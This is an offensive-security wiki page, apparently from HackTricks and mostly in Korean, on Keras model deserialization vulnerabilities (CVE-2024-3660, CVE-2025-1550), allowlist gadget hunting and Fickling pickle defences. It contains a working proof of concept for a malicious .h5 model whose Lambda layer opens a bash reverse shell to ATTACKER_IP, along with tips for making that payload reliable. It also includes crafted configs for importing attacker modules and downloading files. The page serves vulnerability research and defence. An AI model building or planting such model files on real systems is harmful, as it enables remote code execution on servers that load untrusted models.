# Keras Model Deserialization RCE and Gadget Hunting

{{#include ../../banners/hacktricks-training.md}}

이 페이지는 Keras model deserialization pipeline에 대한 practical exploitation techniques를 요약하고, native .keras format의 내부 구조와 attack surface를 설명하며, Model File Vulnerabilities (MFVs) 및 post-fix gadgets를 찾기 위한 researcher toolkit을 제공합니다.

## .keras model format internals

A .keras file은 다음 항목을 최소 하나 이상 포함하는 ZIP archive입니다:<sup>[[1]](#references)</sup>
- metadata.json – generic info (예: Keras version)
- config.json – model architecture (primary attack surface)
- model.weights.h5 – HDF5의 weights

config.json은 recursive deserialization을 제어합니다. Keras는 modules를 import하고, classes/functions를 resolve하며, attacker-controlled dictionaries에서 layers/objects를 재구성합니다.<sup>[[1]](#references)</sup>

Dense layer object의 example snippet:
```json
{
"module": "keras.layers",
"class_name": "Dense",
"config": {
"units": 64,
"activation": {
"module": "keras.activations",
"class_name": "relu"
},
"kernel_initializer": {
"module": "keras.initializers",
"class_name": "GlorotUniform"
}
}
}
```
Deserialization은 다음을 수행합니다:<sup>[[1]](#references)</sup>
- `module/class_name` 키를 사용한 Module import 및 symbol resolution
- 공격자가 제어하는 kwargs를 사용한 `from_config(...)` 또는 constructor 호출
- 중첩된 객체(activations, initializers, constraints 등)로의 재귀

역사적으로 이는 `config.json`을 생성하는 공격자에게 다음 세 가지 primitive를 제공했습니다:<sup>[[1]](#references)</sup>
- 어떤 modules를 import할지 제어
- 어떤 classes/functions를 resolve할지 제어
- constructors/from_config에 전달되는 kwargs 제어

## CVE-2024-3660 – Lambda-layer bytecode RCE

Root cause:
- Legacy Lambda deserialization은 공격자가 제어하는 marshaled code에서 Python function을 재구성했습니다. `func_load()`는 payload를 base64-decode하고, `marshal.loads()`를 호출한 다음, `FunctionType`을 생성합니다. Lambda가 호출되면 결과 function의 bytecode가 실행되며, 영향을 받는 pre-2.13 loaders는 legacy formats에 대해 safe-mode checks를 적용하지 않았습니다.<sup>[[3]](#references)[[16]](#references)[[17]](#references)[[18]](#references)</sup>

Native Keras v3 archive에서 Lambda function은 `__lambda__` object로 표현되며, 해당 object의 `code` field에는 base64-encoded marshaled code가 포함됩니다:<sup>[[17]](#references)[[18]](#references)</sup>
```json
{
"module": "keras.layers",
"class_name": "Lambda",
"config": {
"name": "exploit_lambda",
"function": {
"class_name": "__lambda__",
"config": {
"code": "<base64(marshal.dumps(function.__code__))>",
"defaults": null,
"closure": null
}
}
}
}
```
Mitigation:
- Keras는 native Keras v3 format에 대해 기본적으로 `safe_mode=True`를 적용합니다. `Lambda`에 직렬화된 Python lambda는 사용자가 `safe_mode=False`로 명시적으로 비활성화하지 않는 한 차단됩니다. 이 보호 기능은 legacy formats에는 동일한 방식으로 적용되지 않습니다.<sup>[[1]](#references)[[16]](#references)[[17]](#references)</sup>

Notes:
- Legacy formats(이전 HDF5 저장 형식) 또는 오래된 codebase에서는 최신 검사를 적용하지 않을 수 있으므로, victim이 오래된 loader를 사용할 때는 “downgrade” style attack이 여전히 적용될 수 있습니다.

## CVE-2025-1550 – Keras 3.0.0–3.8.x의 임의 module import

Root cause:
- `_retrieve_class_or_fn`은 `config.json`의 attacker-controlled module 문자열에 `importlib.import_module(module)`을 사용했습니다.
- Impact: 조작된 `.keras` archive를 통해 `Model.load_model()`이 attacker가 선택한 Python module과 function을 import하도록 만들 수 있으며, `safe_mode=True`에서도 import-time side effect와 attacker-controlled argument가 실행될 수 있습니다.<sup>[[1]](#references)[[4]](#references)</sup>

Exploit idea:
```json
{
"module": "maliciouspkg",
"class_name": "Danger",
"config": {"arg": "val"}
}
```
Security improvements (Keras ≥ 3.9):<sup>[[1]](#references)[[2]](#references)</sup>
- Module allowlist: imports가 공식 ecosystem 모듈로 제한됨: keras, keras_hub, keras_cv, keras_nlp
- Safe mode default: safe_mode=True가 unsafe Lambda serialized-function loading을 차단함
- Basic type checking: deserialized objects가 expected types와 일치해야 함

## Practical exploitation: TensorFlow-Keras HDF5 (.h5) Lambda RCE

Legacy TensorFlow-Keras deployments는 여전히 HDF5 model files (`.h5`)를 허용할 수 있습니다. 공격자가 서버에 업로드한 model을 서버가 이후 load하거나 inference를 실행할 수 있다면, affected loader는 attacker-controlled Python을 포함한 Lambda layer를 deserialize할 수 있으며, 이 Python은 애플리케이션의 model workflow에서 실행될 수 있습니다.<sup>[[3]](#references)[[7]](#references)[[16]](#references)</sup>

대상이 model을 invoke할 때 Lambda가 reverse shell을 실행하는 malicious .h5를 생성하는 Minimal PoC:
```python
import tensorflow as tf

def exploit(x):
import os
os.system("bash -c 'bash -i >& /dev/tcp/ATTACKER_IP/PORT 0>&1'")
return x

m = tf.keras.Sequential()
m.add(tf.keras.layers.Input(shape=(64,)))
m.add(tf.keras.layers.Lambda(exploit))
m.compile()
m.save("exploit.h5")  # legacy HDF5 container
```
Notes and reliability tips:
- format과 workflow에 따라 trigger point가 달라집니다. 참조된 write-up에서는 prediction 중 payload가 두 번 실행되었습니다. side effect가 반복될 수 있다고 간주하고 payload를 idempotent하게 작성하세요.<sup>[[7]](#references)</sup>
- Version pinning: serialization mismatch를 방지하려면 victim의 TF/Keras/Python 버전에 맞추세요. 예를 들어 target이 Python 3.8 및 TensorFlow 2.13.1을 사용하는 경우 해당 환경에서 artifact를 빌드하세요.<sup>[[7]](#references)</sup>
- 빠른 environment replication:
```dockerfile
FROM python:3.8-slim
RUN pip install tensorflow-cpu==2.13.1
```
- 검증: `os.system("ping -c 1 YOUR_IP")`와 같은 benign payload는 reverse shell로 전환하기 전에 실행을 확인하는 데 도움이 됩니다(예: `tcpdump`로 ICMP 관찰).<sup>[[7]](#references)</sup>

## allowlist 내부의 fix 이후 gadget surface

Keras module allowlist와 safe mode를 사용하더라도, 허용된 callable이 side effect를 노출할 수 있습니다. 예를 들어 `keras.utils.get_file`은 URL을 다운로드하고 구성된 cache location 아래에 기록하므로 gadget analysis의 후보가 됩니다.<sup>[[1]](#references)[[19]](#references)</sup>

Candidate Lambda configuration (controlled test에서 call signature를 검증):
```json
{
"module": "keras.layers",
"class_name": "Lambda",
"config": {
"name": "dl",
"function": {
"module": "keras.utils",
"class_name": "get_file",
"config": null,
"registered_name": null
},
"arguments": {
"origin": "https://example.com/artifact.bin",
"cache_dir": "/tmp/keras-cache"
}
}
}
```
중요한 제한 사항:
- `Lambda.call()`은 항상 모델 입력을 첫 번째 positional argument로 전달하고, 구성된 `arguments`를 keyword arguments로 전달합니다. `get_file`의 경우 해당 positional value가 `fname`을 채우므로, tensor/path 불일치로 인해 다운로드가 시작되기 전에 이 candidate가 실패할 수 있으며, 따라서 항상 작동하는 gadget은 아닙니다.<sup>[[1]](#references)[[16]](#references)[[19]](#references)</sup>

## AI/ML models의 ML pickle import allowlisting (Fickling)

많은 AI/ML model formats(PyTorch `.pt`/`.pth`/`.ckpt`, joblib/scikit-learn artifacts 및 기타 Python-native formats)은 Python pickle data를 포함합니다. 위의 legacy Keras Lambda path는 대신 marshaled function bytecode를 사용하므로 별도의 deserialization risk입니다. Pickle opcodes는 deserialization 중 attacker-controlled behavior를 실행할 수 있으며, 여기에는 model tampering 또는 RCE가 포함됩니다. 또한 단순한 scanner는 새로운 dangerous imports나 목록에 없는 dangerous imports를 놓칠 수 있습니다.<sup>[[7]](#references)[[8]](#references)[[14]](#references)[[18]](#references)</sup>

실용적인 fail-closed defense는 Python의 pickle deserializer를 hook하고, unpickling 중 검토된 harmless ML-related imports 집합만 허용하는 것입니다. Trail of Bits의 Fickling은 이 policy를 구현하며, 수천 개의 public Hugging Face pickles를 기반으로 구축한 curated ML import allowlist를 제공합니다.<sup>[[8]](#references)[[13]](#references)</sup>

“safe” imports를 위한 security model(연구와 실무에서 도출한 직관): pickle에서 사용되는 imported symbols는 다음 조건을 모두 동시에 충족해야 합니다.<sup>[[8]](#references)</sup>
- code를 실행하거나 execution을 유발하지 않아야 함(compiled/source code objects, shelling out, hooks 등 금지)
- 임의의 attributes 또는 items를 get/set하지 않아야 함
- pickle VM에서 다른 Python objects를 import하거나 해당 objects에 대한 references를 획득하지 않아야 함
- secondary deserializers(예: marshal, nested pickle)를 간접적으로라도 trigger하지 않아야 함

process startup 초기에 가능한 한 빨리 Fickling의 protections를 enable하여, frameworks(torch.load, joblib.load 등)가 수행하는 모든 pickle loads가 검사되도록 하십시오.<sup>[[9]](#references)</sup>
```python
import fickling
# Sets global hooks on the stdlib pickle module
fickling.hook.activate_safe_ml_environment()
```
운영 팁:
- 필요한 경우 hooks를 일시적으로 비활성화하거나 다시 활성화할 수 있습니다:<sup>[[9]](#references)</sup>
```python
fickling.hook.deactivate_safe_ml_environment()
# ... load fully trusted files only ...
fickling.hook.activate_safe_ml_environment()
```
- 알려진 정상 모델이 차단된 경우, symbols를 검토한 후 환경의 allowlist를 확장하세요:<sup>[[9]](#references)</sup>
```python
fickling.hook.activate_safe_ml_environment(also_allow=[
"package.subpackage.safe_symbol",
"another.safe.import",
])
```
- 더 세분화된 제어가 필요하다면 Fickling은 generic runtime guards도 제공합니다:<sup>[[9]](#references)</sup>
- `fickling.always_check_safety()`를 사용해 모든 `pickle.load()`에 검사를 강제
- 범위를 지정해 적용하려면 `with fickling.check_safety():` 사용
- 일회성 검사를 수행하려면 `fickling.load(path)` / `fickling.is_likely_safe(path)` 사용

- 가능한 경우 non-pickle model formats(예: SafeTensors)를 우선 사용하세요.<sup>[[15]](#references)</sup> pickle을 반드시 허용해야 한다면, network egress 없이 least privilege로 loader를 실행하고 allowlist를 강제하세요.

이 allowlist-first 전략은 호환성을 높게 유지하면서 일반적인 ML pickle exploit 경로를 효과적으로 차단합니다. ToB의 benchmark에서 Fickling은 synthetic malicious file의 100%를 탐지했으며, 주요 Hugging Face repo의 clean file 중 약 99%를 허용했습니다.<sup>[[8]](#references)[[10]](#references)</sup>


## Researcher toolkit

1) 허용된 모듈에서 체계적으로 gadget 발견

keras, keras_nlp, keras_cv, keras_hub 전반에서 후보 callable을 열거하고 file/network/process/env side effect가 있는 항목을 우선순위화합니다.<sup>[[1]](#references)</sup>

<details>
<summary>allowlisted Keras module에서 잠재적으로 위험한 callable 열거</summary>
```python
import importlib, inspect, pkgutil

ALLOWLIST = ["keras", "keras_nlp", "keras_cv", "keras_hub"]

seen = set()

def iter_modules(mod):
if not hasattr(mod, "__path__"):
return
for m in pkgutil.walk_packages(mod.__path__, mod.__name__ + "."):
yield m.name

candidates = []
for root in ALLOWLIST:
try:
r = importlib.import_module(root)
except Exception:
continue
for name in iter_modules(r):
if name in seen:
continue
seen.add(name)
try:
m = importlib.import_module(name)
except Exception:
continue
for n, obj in inspect.getmembers(m):
if inspect.isfunction(obj) or inspect.isclass(obj):
sig = None
try:
sig = str(inspect.signature(obj))
except Exception:
pass
doc = (inspect.getdoc(obj) or "").lower()
text = f"{name}.{n} {sig} :: {doc}"
# Heuristics: look for I/O or network-ish hints
if any(x in doc for x in ["download", "file", "path", "open", "url", "http", "socket", "env", "process", "spawn", "exec"]):
candidates.append(text)

print("\n".join(sorted(candidates)[:200]))
```
</details>

2) 직접 deserialization 테스트 (.keras archive 불필요)

조작된 dict를 Keras deserializer에 직접 전달하여 허용되는 params를 파악하고 side effect를 관찰합니다.<sup>[[1]](#references)</sup>
```python
import keras

cfg = {
"module": "keras.layers",
"class_name": "Lambda",
"config": {
"name": "probe",
"function": {
"module": "keras.utils",
"class_name": "get_file",
"config": null,
"registered_name": null
},
"arguments": {
"origin": "https://example.com/x",
"cache_dir": "/tmp/keras-cache"
}
}
}

layer = keras.saving.deserialize_keras_object(cfg, safe_mode=True)  # Observe behavior
```
3) 버전 간 probing 및 형식

Keras는 서로 다른 guardrail과 형식을 사용하는 여러 codebase/세대에 존재합니다:<sup>[[1]](#references)</sup>
- TensorFlow built-in Keras: tensorflow/python/keras (legacy, 삭제 예정)
- tf-keras: 별도로 유지 관리됨
- Multi-backend Keras 3 (official): 네이티브 .keras 도입

codebase와 형식(.keras 및 legacy HDF5) 전반에서 테스트를 반복하여 regression이나 누락된 guard를 찾아냅니다.

## References

- [1] [Keras Model Deserialization의 취약점 탐색 (huntr blog)](https://blog.huntr.com/hunting-vulnerabilities-in-keras-model-deserialization)
- [2] [Keras PR #20751 – serialization에 검사 추가](https://github.com/keras-team/keras/pull/20751)
- [3] [CVE-2024-3660 – Keras Lambda deserialization RCE](https://nvd.nist.gov/vuln/detail/CVE-2024-3660)
- [4] [CVE-2025-1550 – Keras arbitrary module import (≤ 3.8)](https://nvd.nist.gov/vuln/detail/CVE-2025-1550)
- [5] [huntr report – arbitrary import #1](https://huntr.com/bounties/135d5dcd-f05f-439f-8d8f-b21fdf171f3e)
- [6] [huntr report – arbitrary import #2](https://huntr.com/bounties/6fcca09c-8c98-4bc5-b32c-e883ab3e4ae3)
- [7] [HTB Artificial – TensorFlow .h5 Lambda RCE에서 root까지](https://0xdf.gitlab.io/2025/10/25/htb-artificial.html)
- [8] [Trail of Bits blog – Fickling의 새로운 AI/ML pickle file scanner](https://blog.trailofbits.com/2025/09/16/ficklings-new-ai/ml-pickle-file-scanner/)
- [9] [Fickling – AI/ML environments 보안 강화 (README)](https://github.com/trailofbits/fickling#securing-aiml-environments)
- [10] [Fickling pickle scanning benchmark corpus](https://github.com/trailofbits/fickling/tree/master/pickle_scanning_benchmark)
- [11] [Picklescan](https://github.com/mmaitre314/picklescan)
- [12] [ModelScan](https://github.com/protectai/modelscan)
- [13] [model-unpickler](https://github.com/goeckslab/model-unpickler)
- [14] [Sleepy Pickle attacks 배경](https://blog.trailofbits.com/2024/06/11/exploiting-ml-models-with-pickle-file-attacks-part-1/)
- [15] [SafeTensors project](https://github.com/safetensors/safetensors)
- [16] [CERT/CC VU#253266 – Keras 2 Lambda Layers에서 arbitrary code injection 허용](https://kb.cert.org/vuls/id/253266)
- [17] [Keras Lambda layer source (v3.10.0)](https://github.com/keras-team/keras/blob/v3.10.0/keras/src/layers/core/lambda_layer.py)
- [18] [Keras Python utilities source (v3.10.0)](https://github.com/keras-team/keras/blob/v3.10.0/keras/src/utils/python_utils.py)
- [19] [Keras `get_file` API](https://keras.io/api/utils/python_utils/#get_file-function)
{{#include ../../banners/hacktricks-training.md}}
